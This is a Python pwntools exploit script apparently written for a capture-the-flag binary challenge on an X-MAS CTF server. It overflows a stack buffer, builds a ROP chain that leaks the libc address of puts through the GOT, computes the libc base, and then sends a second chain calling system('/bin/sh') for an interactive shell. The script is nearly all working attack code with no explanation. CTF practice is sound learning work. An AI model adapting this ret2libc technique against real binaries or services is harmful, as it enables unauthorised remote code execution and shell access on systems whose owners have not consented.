from pwn import*
import sys 

LIBCFILE = 'libc.so.6'
LIBCLOCAL = '/lib/x86_64-linux-gnu/libc-2.31.so'
BINFILE = './chall'
HOST = 'challs.xmas.htsp.ro'
PORT = 2001



def solve(DEBUG):
    elf = ELF(BINFILE)
    libc = ELF(LIBCLOCAL)
    if DEBUG=="1":
        p = process(BINFILE)
        exploit(p,elf,libc)
    elif DEBUG=="2":
        libc = ELF(LIBCFILE)
        p = remote(HOST,PORT)
        exploit(p,elf,libc)
    else:
        p = process(BINFILE)
        raw_input('DEBUG')
        exploit(p,elf,libc)

def exploit(p,elf,libc):
    main = 0x004007fb   # lea rdi, qword str.Hi._How_are_you_doing_today__good_sir__Ready_for_Christmas
    pop_rdi = 0x00000000004008e3
    pop_ret = 0x00000000004005e6
    bss_addr = 0x601800 # 0x601000 + 0x800  ==> 0x601000 -> dia chi bat dau cua .bss
    acatflag = 0x601068
    
    
    p.recvuntil('Hi. How are you doing today, good sir? Ready for Christmas?\n')
    payload = "A"*0x40
    payload += p64(bss_addr)    #rbp
    payload += p64(pop_rdi)
    payload += p64(elf.symbols['got.puts'])
    payload += p64(elf.symbols['plt.puts'])
    payload += p64(main)
    p.sendline(payload)
    
    
    recieved = p.recvline().strip()
    leak_puts = u64(recieved.ljust(8,b"\x00"))
    print "puts: ", hex(leak_puts)
    offset_puts = libc.symbols['puts']
    print "off_puts: ", hex(offset_puts)
    libc_base = leak_puts - offset_puts
    
    
    p.recvuntil('Hi. How are you doing today, good sir? Ready for Christmas?\n')
    
    offset_system = libc.symbols['system']
    offset_binsh = libc.search('/bin/sh').next()
    system = libc_base + offset_system
    binsh = libc_base + offset_binsh
    
    payload = "A"*0x1f
    payload += "\x00"
    payload += "A"*0x20
    payload +=  p64(bss_addr+0x30)   #rbp 
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(pop_ret)
    payload += p64(system)
    p.sendline(payload)
    
    
    
    p.interactive()
          
solve(sys.argv[1])